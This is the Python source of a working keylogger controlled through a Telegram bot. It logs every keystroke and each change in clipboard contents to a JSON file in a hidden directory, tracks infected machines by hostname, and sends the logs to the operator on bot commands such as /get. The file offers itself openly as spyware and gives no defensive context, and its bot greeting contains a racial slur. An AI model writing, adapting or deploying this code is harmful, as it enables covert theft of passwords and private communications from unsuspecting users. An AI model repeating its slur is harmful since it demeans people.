# this version has multiple device support. you can select device in case you have this on lot of computers

import os
import json
import pyperclip
from pynput import keyboard
from datetime import datetime, timedelta
import platform
import time
from telegram import Update, Bot
from telegram.ext import Updater, CommandHandler, CallbackContext
import logging

# Initialize Telegram bot with token
TELEGRAM_BOT_TOKEN = "TELEGRAM_BOT_TOKEN"
bot = Bot(TELEGRAM_BOT_TOKEN)

# Set up logging for Telegram bot
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
logger = logging.getLogger(__name__)

# Directory and file setup
def get_hidden_dir():
    if os.name == 'nt':  # Windows
        path = os.path.join(os.environ['ProgramData'], 'hidden_dir')
    else:  # Linux/macOS
        path = os.path.expanduser('~/.hidden_dir')
    if not os.path.exists(path):
        os.makedirs(path)
    return path

json_file_path = os.path.join(get_hidden_dir(), 'keylog.json')

# Initialize or reset JSON log file
def initialize_json_file():
    with open(json_file_path, 'w') as file:
        json.dump([], file)

# Load existing data from JSON file
def load_json_data():
    with open(json_file_path, 'r') as file:
        return json.load(file)

# Save data to JSON file
def save_json_data(data):
    with open(json_file_path, 'w') as file:
        json.dump(data, file, indent=4)

# Check if Caps Lock is active (cross-platform)
def is_capslock_on():
    if platform.system() == 'Windows':
        import ctypes
        return ctypes.WinDLL('User32.dll').GetKeyState(0x14) != 0
    elif platform.system() == 'Darwin':  # macOS
        import Quartz
        caps_lock_state = Quartz.CGEventSourceFlagsState(Quartz.kCGEventSourceStateHIDSystemState)
        return (caps_lock_state & Quartz.kCGEventFlagMaskAlphaShift) != 0
    else:
        import subprocess
        xset_output = subprocess.check_output(['xset', 'q']).decode()
        return 'Caps Lock:   on' in xset_output

# Variable to track the last timestamp and clipboard content
last_timestamp = datetime.now() - timedelta(minutes=15)
last_clipboard_content = None

# Track online devices and selection
devices = {}
selected_device = None

# Function to log keystrokes with timestamp every 15 minutes
def log_keystroke(key):
    global last_timestamp

    current_time = datetime.now()
    key_data = str(key).replace("'", "")

    if key == keyboard.Key.space:
        key_data = ' '
    elif key == keyboard.Key.enter:
        key_data = '\n'

    if is_capslock_on() and key_data.isalpha():
        key_data = key_data.upper()

    data = load_json_data()

    if current_time - last_timestamp >= timedelta(minutes=15):
        data.append({
            'timestamp': str(current_time),
            'event': 'Timestamp logged'
        })
        last_timestamp = current_time

    data.append({
        'key': key_data
    })

    save_json_data(data)

# Function to log clipboard content only when it changes
def log_clipboard():
    global last_clipboard_content

    current_time = datetime.now()
    clipboard_data = pyperclip.paste()

    if clipboard_data != last_clipboard_content and clipboard_data:
        data = load_json_data()
        data.append({
            'timestamp': str(current_time),
            'copied': clipboard_data
        })
        save_json_data(data)
        last_clipboard_content = clipboard_data

# Listener for keyboard events
def on_press(key):
    try:
        log_keystroke(key)
    except Exception as e:
        pass

# Register device command with name and OS information
def register_device(device_id):
    device_name = platform.node()
    os_info = f"{platform.system()} {platform.release()}"
    if device_id not in devices:
        devices[device_id] = f"{device_name} ({os_info})"

# Telegram bot command handlers
def start(update: Update, context: CallbackContext):
    instructions = (
        "Welcome nigga! Your Keylogger commands here:\n\n"
        "/select <number> - Select a device by its number.\n"
        "/unselect - Unselects the current device.\n"
        "/get - Retrieve the JSON keystroke log from the selected device.\n"
        "/clear - Clear and reset the JSON log file on the selected device.\n\n"
        "Example: Type /select 1 to select the first device.\n\n"
        "Available Devices:\n"
    )

    device_list = "\n".join(
        [
            f"{i + 1}. {name}"
            for i, (device_id, name) in enumerate(devices.items())
        ]
    )
    
    update.message.reply_text(f"{instructions}{device_list}")

def select_device(update: Update, context: CallbackContext):
    global selected_device
    try:
        device_number = int(context.args[0]) - 1
        selected_device = list(devices.keys())[device_number]
        update.message.reply_text(f"Selected {devices[selected_device]}")
    except (IndexError, ValueError):
        update.message.reply_text("Invalid selection")

def unselect_device(update: Update, context: CallbackContext):
    global selected_device
    selected_device = None
    update.message.reply_text("Device unselected")

def get_json(update: Update, context: CallbackContext):
    if selected_device:
        if os.path.exists(json_file_path):
            update.message.reply_document(open(json_file_path, 'rb'))
        else:
            update.message.reply_text("JSON file not found.")
    else:
        update.message.reply_text("No device selected")

def clear_json(update: Update, context: CallbackContext):
    if selected_device:
        if os.path.exists(json_file_path):
            os.remove(json_file_path)
            initialize_json_file()
            update.message.reply_text("JSON file deleted and reset.")
        else:
            initialize_json_file()
            update.message.reply_text("No JSON file to delete. A new file has been created.")
    else:
        update.message.reply_text("No device selected")

# Run keyboard listener
listener = keyboard.Listener(on_press=on_press)
listener.start()

# Periodically check clipboard content (every 5 seconds)
def clipboard_loop():
    while True:
        log_clipboard()
        time.sleep(5)

# Set up the Telegram bot handlers
def main():
    updater = Updater(TELEGRAM_BOT_TOKEN)
    dp = updater.dispatcher

    dp.add_handler(CommandHandler("start", start))
    dp.add_handler(CommandHandler("select", select_device))
    dp.add_handler(CommandHandler("unselect", unselect_device))
    dp.add_handler(CommandHandler("get", get_json))
    dp.add_handler(CommandHandler("clear", clear_json))

    # Start polling for Telegram commands
    updater.start_polling()

    # Start the clipboard loop
    clipboard_loop()

if __name__ == '__main__':
    # Initialize JSON file on startup if it doesn't exist
    if not os.path.exists(json_file_path):
        initialize_json_file()

    # Register device with a unique ID (e.g., hostname or other identifier)
    device_id = platform.node()  # Unique ID (e.g., hostname)
    register_device(device_id)

    main()
